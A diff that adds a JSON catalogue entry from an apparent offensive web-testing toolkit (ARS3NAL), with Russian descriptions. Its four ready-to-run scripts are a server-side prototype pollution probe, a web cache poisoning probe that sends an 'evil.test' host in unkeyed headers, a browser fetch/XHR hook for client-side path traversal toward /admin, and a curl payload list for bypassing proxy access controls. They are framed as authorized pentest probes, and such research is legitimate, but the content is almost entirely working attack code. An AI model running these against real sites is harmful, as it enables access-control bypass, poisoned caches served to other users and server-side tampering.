@@ -1,0 +1,68 @@
+{
+  "category": "Modern Web",
+  "group": "modern",
+  "catOrder": 63,
+  "entries": [
+    {
+      "title": "Server-side prototype pollution probe (SSPP, status 510)",
+      "lang": "python",
+      "tags": [
+        "prototype-pollution",
+        "sspp",
+        "blackbox"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}}",
+      "source": "https://portswigger.net/research/server-side-prototype-pollution",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Чёрный ящик для **server-side prototype pollution (SSPP)** методом Gareth Heyes (PortSwigger). Не ломает сервер, а ищет **изменение поведения** после засева `__proto__`: переопределение HTTP-статуса (gadget `status: 510`) и реакция на gadget `json spaces` (отступы в JSON-ответе меняются). Безопасно: только наблюдаемые сайд-эффекты, без DoS.\n\n> SSPP не видно напрямую: загрязняешь прототип через JSON-тело, затем шлёшь обычный запрос и смотришь, не «протёк» ли gadget. status 510 - канонический детектор: если сервер вдруг отвечает 510, прототип загрязнён.\n\ndeps: `pip install requests`. placeholders: `{{URL}}` (endpoint, принимающий JSON POST).\n\n```python\n#!/usr/bin/env python3\n# proto_pollution_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, json, requests\n\n# gadget-полезные нагрузки: ключ -> что засеваем -> как детектим\ndef pollute_bodies():\n    return [\n        (\"status override 510\",\n         {\"__proto__\": {\"status\": 510}},\n         lambda base, r: r.status_code == 510 and base != 510),\n        (\"json spaces gadget\",\n         {\"__proto__\": {\"json spaces\": 10}},\n         None),  # детект по изменению отступов, см. ниже\n        (\"constructor route\",\n         {\"constructor\": {\"prototype\": {\"status\": 510}}},\n         lambda base, r: r.status_code == 510 and base != 510),\n    ]\n\ndef send(url, body, hdr, timeout):\n    return requests.post(url, json=body, headers=hdr, timeout=timeout, verify=False)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL server-side prototype pollution probe\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"endpoint accepting JSON POST\")\n    ap.add_argument(\"--header\", action=\"append\", default=[])\n    ap.add_argument(\"--timeout\", type=int, default=20)\n    a = ap.parse_args()\n    requests.packages.urllib3.disable_warnings()\n    hdr = {\"Content-Type\": \"application/json\"}\n    for h in a.header:\n        k, _, v = h.partition(\":\"); hdr[k.strip()] = v.strip()\n\n    base = send(a.url, {\"ars3nal\": \"baseline\"}, hdr, a.timeout)\n    base_code = base.status_code\n    base_indent = base.text[:200]\n    print(f\"[*] baseline status={base_code}\\n\")\n\n    for label, body, detect in pollute_bodies():\n        try:\n            send(a.url, body, hdr, a.timeout)              # засев\n            probe = send(a.url, {\"ars3nal\": \"after\"}, hdr, a.timeout)  # наблюдение\n        except requests.RequestException as e:\n            print(f\"  [{label}] error: {e}\"); continue\n        if detect:\n            polluted = detect(base_code, probe)\n        else:\n            # json spaces: ответ стал заметно «шире» по отступам\n            polluted = (probe.text[:200] != base_indent and\n                        probe.text.count(\"  \") > base_indent.count(\"  \") + 3)\n        tag = \"POLLUTED\" if polluted else \"clean   \"\n        print(f\"  [{tag}] {label}  (probe status={probe.status_code})\")\n    print(\"\\n[i] любой POLLUTED -> подтверждай отдельным gadget'ом и фикси прототип\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 proto_pollution_probe.py -u https://target/api/profile --header \"Cookie: session=...\"\n```"
+    },
+    {
+      "title": "Web cache poisoning probe (unkeyed headers + fat GET)",
+      "lang": "python",
+      "tags": [
+        "cache-poisoning",
+        "unkeyed",
+        "fat-get"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}}",
+      "source": "https://portswigger.net/web-security/web-cache-poisoning",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Проба **web cache poisoning**: ищет **unkeyed-заголовки** (X-Forwarded-Host/Scheme, X-Host, X-Original-URL, X-Rewrite-URL), значение которых отражается в ответе, но не входит в cache key. Если отражение кэшируется - твоя «отравленная» версия отдаётся другим. Плюс проба **fat GET** (тело в GET-запросе).\n\n> Метод: шлёшь уникальный маркер в заголовке, проверяешь отражение в ответе, затем повтор без заголовка - если маркер всё ещё там (из кэша), страница отравлена. Признаки кэша: `X-Cache: hit`, `Age`, `CF-Cache-Status`.\n\ndeps: `pip install requests`. placeholders: `{{URL}}`.\n\n```python\n#!/usr/bin/env python3\n# cache_poison_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, time, requests\n\nUNKEYED = [\n    \"X-Forwarded-Host\", \"X-Forwarded-Scheme\", \"X-Forwarded-Server\",\n    \"X-Host\", \"X-Original-URL\", \"X-Rewrite-URL\", \"X-Forwarded-Prefix\",\n]\n\ndef cache_state(r):\n    for h in (\"X-Cache\", \"CF-Cache-Status\", \"X-Cache-Status\", \"Age\"):\n        if h in r.headers:\n            return f\"{h}={r.headers[h]}\"\n    return \"no cache header\"\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL cache poisoning probe\")\n    ap.add_argument(\"-u\", \"--url\", required=True)\n    ap.add_argument(\"--timeout\", type=int, default=20)\n    a = ap.parse_args()\n    requests.packages.urllib3.disable_warnings()\n    s = requests.Session()\n    marker = \"ars3nal\" + str(int(time.time()))\n\n    print(f\"[*] {a.url}  marker={marker}\\n\")\n    for h in UNKEYED:\n        val = f\"{marker}.evil.test\"\n        try:\n            r1 = s.get(a.url, headers={h: val}, timeout=a.timeout, verify=False)\n        except requests.RequestException as e:\n            print(f\"  {h}: error {e}\"); continue\n        reflected = marker in r1.text\n        # повтор БЕЗ заголовка: если маркер остался -> закэшировано\n        r2 = s.get(a.url, timeout=a.timeout, verify=False)\n        cached = marker in r2.text\n        tag = \"POISONED\" if (reflected and cached) else (\"reflect\" if reflected else \"       \")\n        print(f\"  [{tag:8s}] {h:22s} reflect={reflected} cached={cached}  ({cache_state(r1)})\")\n\n    print(\"\\n=== fat GET (body in GET) ===\")\n    try:\n        rg = s.request(\"GET\", a.url, data=f\"x={marker}\", timeout=a.timeout, verify=False,\n                       headers={\"Content-Type\": \"application/x-www-form-urlencoded\"})\n        print(f\"  status={rg.status_code} marker_reflected={marker in rg.text}  ({cache_state(rg)})\")\n    except requests.RequestException as e:\n        print(f\"  fat GET error: {e}\")\n    print(\"\\n[=] POISONED = unkeyed header отражается И кэшируется\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 cache_poison_probe.py -u https://target/\n```"
+    },
+    {
+      "title": "Client-Side Path Traversal (CSPT) finder",
+      "lang": "javascript",
+      "tags": [
+        "cspt",
+        "cspt2csrf",
+        "client-side",
+        "fetch-hook"
+      ],
+      "rating": "must",
+      "deps": "нет (DevTools console)",
+      "placeholders": "{{MARKER}}",
+      "source": "https://blog.doyensec.com/2024/07/02/cspt2csrf.html",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "**Client-Side Path Traversal (CSPT)** finder: хук на `fetch`/`XHR` в браузере, который логирует все исходящие запросы и проверяет, можно ли управляемым вводом протащить `../` и сменить путь fetch'а на чужой эндпоинт. Класс CSPT2CSRF (Doyensec, 2024-2025) - один из горячих: ~пятая часть веб-багов 2025.\n\n> Вставляешь как сниппет в DevTools Console на странице цели. Дальше кликаешь по приложению - хук показывает, какие fetch строят URL из пользовательского ввода. Если в путь попадает `../../`, и сервер это глотает - CSPT, который часто доводится до CSRF на чувствительный эндпоинт.\n\ndeps: нет (DevTools console). placeholders: `{{MARKER}}` (строка-маркер из твоего ввода, напр. имя файла/id).\n\n```javascript\n// cspt_finder.js - ARS3NAL (GPL-3.0). Paste in DevTools console. AUTHORIZED only.\n(() => {\n  const MARKER = \"ars3nal\";            // подставь свой контролируемый ввод\n  const TRAVERSAL = /\\.\\.(\\/|%2f|\\\\)/i;\n  const log = (tag, url, extra=\"\") =>\n    console.log(`%c[CSPT ${tag}]`, \"color:#e63\", url, extra);\n\n  // 1) hook fetch\n  const _fetch = window.fetch;\n  window.fetch = function (input, init) {\n    const url = (typeof input === \"string\") ? input : (input && input.url) || \"\";\n    if (url.includes(MARKER)) log(\"fetch+marker\", url);\n    if (TRAVERSAL.test(url)) log(\"fetch TRAVERSAL\", url, \"<-- path escapes!\");\n    // эвристика: ввод подставлен в сегмент пути, а не в query\n    try {\n      const u = new URL(url, location.origin);\n      if (u.pathname.includes(MARKER)) log(\"marker in PATH (CSPT-prone)\", u.pathname);\n    } catch (e) {}\n    return _fetch.apply(this, arguments);\n  };\n\n  // 2) hook XHR\n  const _open = XMLHttpRequest.prototype.open;\n  XMLHttpRequest.prototype.open = function (method, url) {\n    if (String(url).includes(MARKER)) log(\"xhr+marker\", url);\n    if (TRAVERSAL.test(String(url))) log(\"xhr TRAVERSAL\", url, \"<-- path escapes!\");\n    return _open.apply(this, arguments);\n  };\n\n  console.log(\"%c[ARS3NAL CSPT hook armed]\", \"color:#3c3\",\n    `marker=${MARKER}. Теперь кликай по приложению и следи за [CSPT ...].`);\n})();\n```\n\nЗапуск:\n```text\n1. Открой цель, в инпут (имя файла/id/категория) введи строку MARKER.\n2. Вставь сниппет в DevTools Console, нажми Enter.\n3. Кликай по приложению. Лог [CSPT ...] -> ввод попал в ПУТЬ fetch.\n4. Подставь ../../api/admin вместо MARKER -> если сервер обработал, это CSPT (-> CSRF).\n```"
+    },
+    {
+      "title": "Proxy misrouting / path-confusion probe",
+      "lang": "bash",
+      "tags": [
+        "proxy",
+        "path-confusion",
+        "acl-bypass"
+      ],
+      "rating": "nice",
+      "deps": "curl",
+      "placeholders": "{{BASE}} · {{PROTECTED}}",
+      "source": "https://portswigger.net/research/breaking-the-chains-on-http-request-router",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Проба **рассинхрона маршрутизации прокси** (path-confusion): фронт-прокси и бэкенд по-разному нормализуют путь, и трюками `..;/`, `/%2e%2e/`, обратный слеш, двойной слеш можно дотянуться до защищённых путей (`/admin`, internal), которые прокси «думает» заблокировал.\n\n> Идея: прокси видит безобидный путь, бэкенд - после нормализации - видит `/admin`. Скрипт берёт защищённый путь и пробует пачку обходов, сравнивая код ответа с прямым запросом.\n\ndeps: `curl`. placeholders: `{{BASE}}` (база), `{{PROTECTED}}` (защищённый путь, напр. /admin).\n\n```bash\n#!/usr/bin/env bash\n# proxy_misrouting_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nBASE=\"${1:?usage: proxy_misrouting_probe.sh <base-url> <protected-path>}\"\nP=\"${2:?need protected path e.g. /admin}\"\nBASE=\"${BASE%/}\"; P=\"/${P#/}\"\nC=\"curl -s -k -o /dev/null --max-time 8 -w %{http_code}\"\n\ndirect=$($C \"$BASE$P\")\necho \"[*] direct $P -> $direct (ожидаем 401/403)\"\necho\n\n# набор обходов; %s -> защищённый сегмент без ведущего слеша\nSEG=\"${P#/}\"\nPAYLOADS=\"\n/..;/$SEG\n/%2e%2e/$SEG\n/./$SEG\n//$SEG\n/$SEG/.\n/$SEG..;/\n/%2f$SEG\n/..%2f$SEG\n/;/$SEG\n/$SEG%00\n/$SEG/..%2f..%2f$SEG\n\"\n\necho \"$PAYLOADS\" | while read -r path; do\n  [ -z \"$path\" ] && continue\n  code=$($C \"$BASE$path\")\n  flag=\"\"\n  case \"$code\" in\n    200|301|302) flag=\"  <-- reachable (bypass?)\";;\n  esac\n  printf \"  %-3s %s%s\\n\" \"$code\" \"$path\" \"$flag\"\ndone\n\necho\necho \"[=] 200/redirect там, где direct давал 401/403 = обход маршрутизации\"\n```\n\nЗапуск:\n```bash\nbash proxy_misrouting_probe.sh https://target /admin\n```"
+    }
+  ]
+}
